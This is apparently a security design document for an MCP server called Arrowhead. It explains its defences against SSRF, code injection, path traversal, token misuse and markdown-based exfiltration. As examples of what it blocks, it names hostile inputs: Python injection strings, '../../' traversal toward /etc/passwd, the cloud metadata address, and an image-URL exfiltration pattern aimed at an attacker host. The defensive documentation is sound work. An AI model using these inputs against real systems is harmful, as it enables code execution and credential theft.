# Security

This document maps each mitigation in Arrowhead to the vulnerability class it
closes. The three tools were chosen because they correspond to the three most
common flaws found in real MCP servers; the surrounding layers (auth, rate
limiting, audit logging) close the fourth, missing authentication.

## Server-side request forgery — `safe_fetch`

**Risk.** A fetch tool that accepts an arbitrary URL can be pointed at the
cloud metadata endpoint (`169.254.169.254`), at internal services on private
ranges, or at loopback, exfiltrating credentials or reaching systems the
caller should never touch.

**Mitigation** (`security/ssrf_guard.py`, `tools/safe_fetch.py`):

- The scheme must be `http` or `https`; everything else (`file:`, `gopher:`,
  `dict:`, …) is refused before any network activity.
- The hostname is resolved and every resolved address is checked. If any
  address is not globally routable unicast — private, loopback, link-local,
  carrier-grade NAT, multicast, or the metadata address — the request is
  refused. Mixed public-and-private DNS answers are refused as a whole.
- The approved address is **pinned**: the connection is made to that exact IP
  while the original hostname travels in the `Host` header and as the TLS
  server name. Because the address is never re-resolved between the check and
  the connection, DNS rebinding cannot swap a public record for a private one.
- Redirects are followed manually, and the guard runs again on every hop, so a
  public URL that 302-redirects toward the metadata endpoint is caught.
- Response bodies are capped; the outbound request carries none of the
  caller's MCP credentials.

## Command and code injection — `calculate`

**Risk.** Passing user input to `eval`, `exec`, or a shell lets an attacker run
arbitrary code. This is the single most common MCP server flaw.

**Mitigation** (`security/input_validation.py`, `security/sandbox.py`,
`tools/calculate.py`) — two independent layers:

1. A strict character allowlist accepts only digits, `+ - * / ( ) .`, and
   whitespace. `1+1; import os`, `__import__('os')`, and backtick or `$()`
   shell syntax are all rejected here, before reaching any evaluator.
2. The expression is then parsed to an AST and walked by an interpreter that
   recognizes only numeric literals, the four binary operators, and unary
   plus/minus. Names, calls, attributes, subscripts, and exponentiation are
   refused even though some of them pass the character allowlist — for
   example `2 ** 8` is caught by this second layer. Node count is bounded to
   prevent pathological evaluation cost.

There is no `eval`, no `exec`, and no `subprocess` anywhere in the path.

## Path traversal — `read_file`

**Risk.** A file reader that trusts the requested path can be walked out of its
intended directory with `../../` sequences, absolute paths, or symlinks,
exposing `/etc/passwd`, SSH keys, or application secrets.

**Mitigation** (`security/input_validation.py`, `tools/read_file.py`):

- The path must be relative, contain no `..` components, and carry no null
  bytes; absolute paths are refused up front.
- The path is joined to the configured jail root and fully resolved with
  symlinks followed. The result must still be inside the jail root, so a
  symlink placed inside the jail that points outside it is refused.
- Error messages never echo the requested path, so a probing caller cannot use
  them to map the filesystem.
- Files above a configured size are refused.

## Authentication and authorization

**Risk.** A large share of MCP servers ship with no authentication, and among
those that have it, token mismanagement — accepting tokens minted for other
audiences, or forwarding the caller's token to downstream services — is the
top risk.

**Mitigation** (`auth/oauth.py`, `auth/scopes.py`):

- Arrowhead is an OAuth 2.1 **resource server**. It never issues tokens; an
  external authorization server does. Every HTTP request's bearer token is
  verified for signature, issuer, and expiry.
- **Audience validation is mandatory.** A token whose `aud` does not name this
  server is rejected with 401 even when its signature, issuer, and expiry are
  all valid. Enabling auth without an audience configured is a startup error.
- **No token passthrough.** Outbound `safe_fetch` requests are built from
  scratch and carry no inbound credentials; a regression test asserts the
  absence of any `Authorization` header or cookie.
- Each tool requires a scope; a caller lacking it cannot see the tool in
  `tools/list` and cannot call it. Protected-resource metadata is published at
  `/.well-known/oauth-protected-resource/mcp` per RFC 9728.

### Identity provider

Arrowhead is a resource server, so it needs an external authorization server
to issue tokens. Two provider paths are configurable (`ARROWHEAD_OAUTH_PROVIDER`):

- **`workos`** (recommended for a hosted deployment): WorkOS AuthKit is
  purpose-built for MCP. It supports the Dynamic Client Registration and
  Client-ID-Metadata-Document registration MCP clients use to self-register,
  hosts the authorization server, and serves the discovery metadata. Set
  `ARROWHEAD_OAUTH_AUTHKIT_DOMAIN` to the AuthKit domain and
  `ARROWHEAD_SERVER_PUBLIC_URL` to this server's canonical URL.
- **`jwt`** (bring-your-own-IdP): verify against any OAuth 2.1 issuer via its
  JWKS URI (preferred) or a static public key. Point `ARROWHEAD_OAUTH_ISSUER`,
  `ARROWHEAD_OAUTH_AUDIENCE` (the canonical resource URI), and
  `ARROWHEAD_OAUTH_JWKS_URI` at the IdP. **Keycloak** is a good open-source,
  self-hostable choice here, though its RFC 8707 resource-indicator support is
  still a manual mapper exercise as of early 2026.

The JWKS verification path (key discovery, key rotation, and audience
validation with a JWKS-sourced signature) is covered by an integration test
that serves a key set in-process, so the production path is exercised, not only
a static-key stub.

## Document tools: content, authorization, and mutation

The document suite (`doc_search`, `doc_read`, `doc_retrieve`, `doc_scan`,
`doc_write`) operates over a jailed corpus of JSON, Markdown, and text files
and adds three mitigations beyond the ones above.

**Untrusted content boundary** (`content/`). A tool result flows back into a
model's context, where prose could read as instructions. Every returned
document is sanitized for its format and wrapped in provenance:

- JSON (`content/json_safe.py`) is parsed with size, pre-parse nesting-depth,
  element-count, and duplicate-key bounds, rejects non-standard NaN/Infinity,
  and is re-serialized canonically. Python's parser never instantiates
  arbitrary types, so CWE-502 gadget chains do not apply.
- Markdown (`content/markdown_safe.py`) has raw HTML stripped, image URLs
  dropped (killing zero-click `![](attacker/?secret=…)` exfiltration), links
  restricted to http/https, and `javascript:`/`data:`/`file:` scheme URIs
  neutralized.
- Text (`content/text_safe.py`) has ANSI escapes, control characters, and
  zero-width/bidi characters stripped, a UTF-7 byte-order mark refused, and is
  always decoded as UTF-8 and NFC-normalized.
- Every return is wrapped (`content/provenance.py`) in randomized per-response
  delimiters plus structured metadata and an untrusted-data notice.

**Scope is necessary but not sufficient** (`authz/`). The MCP guidance names
treating the token scope as sufficient an anti-pattern, so each document call
passes a per-resource authorization check after its scope check. Scopes are
split by verb (`docs:search/read/scan/write`); the default policy grants
corpus-wide search/read/scan but confines writes to the caller's own
`<subject>/` namespace, so cross-subject writes are denied. The `Authorizer`
protocol is the seam for an external policy engine (OPA, Cedar). A denial is
audited distinctly (error type `AuthorizationError`) and never echoes the
resource.

**Write-path safety** (`store/document_store.py`, `doc_write`). Writes are
jailed after full path canonicalization (symlink escapes refused), atomic
(temp file, fsync, move into place, so no partial document is ever read), and
no-clobber by default via a race-free hard link. Per-document size and total
corpus quota caps apply. Overwriting is destructive: it requires an explicit
flag and, when the client supports it, human confirmation via elicitation
bound to the token subject; an explicit decline blocks the write.

**Secret and PII redaction** (`security/secret_scan.py`). `doc_scan` reports a
type, a location, and a redacted placeholder `[REDACTED:TYPE:tag]` whose tag is
a short non-reversible hash. The raw value is never returned or logged; an
adversarial test asserts this for each secret type.

**Search denial-of-service** (`security/search_match.py`). Search is literal by
default. Regex is opt-in and disabled by default, and when enabled runs through
a ReDoS-resistant engine with a hard per-match timeout, applied per line.
Results, files scanned, and aggregate bytes are all bounded.

### A note on scope enforcement

Per the MCP spec, an under-scoped call SHOULD receive a `403` with a
`WWW-Authenticate: insufficient_scope` step-up challenge. Arrowhead instead
hides a tool the caller lacks the scope for (it is filtered from `tools/list`
and reported as unknown on call). This is a deliberate choice: revealing that a
tool exists and which scope it needs leaks the tool surface and scope taxonomy
to an under-privileged caller. The MUST-level discovery path (401 with
`WWW-Authenticate` and `resource_metadata` on a missing or invalid token) is
still served.

## Abuse controls and observability

- **Rate limiting** (`security/rate_limit.py`): per-caller, per-tool token
  buckets with cost-appropriate ceilings. Backed by Redis when configured so
  limits hold across replicas. Exceeding a limit is a clean error, not a crash.
- **Kill switch** (`security/kill_switch.py`): any tool can be taken out of
  service through configuration without a code change.
- **Audit log** (`observability/audit_log.py`): one structured line per call
  with caller identity, tool, argument *shapes* (never values), status, and
  latency. Redaction happens at the source, so secrets in arguments never
  reach log storage.
- **Tracing** (`observability/tracing.py`): an OpenTelemetry span per call that
  joins the caller's W3C trace context.

## Transport security

FastMCP does not terminate TLS. In any non-local deployment the hosting
platform or a reverse proxy must provide HTTPS. The HTTP endpoint also enforces
`Host` and `Origin` allowlists (configurable) to defend against DNS rebinding
of the endpoint itself.
